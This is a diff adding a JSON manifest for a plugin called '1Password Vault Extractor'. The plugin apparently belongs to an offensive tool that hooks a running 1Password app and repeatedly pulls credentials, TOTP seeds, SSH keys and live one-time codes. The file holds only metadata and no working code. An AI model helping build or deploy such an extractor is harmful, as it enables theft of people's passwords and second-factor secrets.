@@ -1,0 +1,44 @@
+{
+  "id": "onepassword",
+  "name": "1Password Vault Extractor",
+  "version": "1.0.0",
+  "description": "Extracts vault items including credentials, TOTP seeds, SSH keys, and metadata from a running 1Password instance.",
+  "author": "operator",
+  "targetApps": ["1password", "1Password"],
+  "capabilities": {
+    "mainProcess": true,
+    "renderer": false,
+    "ui": true
+  },
+  "dataTypes": [
+    {
+      "name": "vault_item",
+      "label": "Vault Items",
+      "fields": ["title", "category", "vault", "fields"]
+    },
+    {
+      "name": "vault_summary",
+      "label": "Vault Summary",
+      "fields": ["accounts", "vaults", "itemCount"]
+    },
+    {
+      "name": "totp_code",
+      "label": "TOTP Codes",
+      "fields": ["title", "code", "url"]
+    }
+  ],
+  "settings": [
+    {
+      "key": "extractInterval",
+      "label": "Extraction interval (seconds, 0=once)",
+      "type": "number",
+      "default": 120
+    },
+    {
+      "key": "extractTotp",
+      "label": "Extract live TOTP codes (1=yes, 0=no)",
+      "type": "number",
+      "default": 1
+    }
+  ]
+}
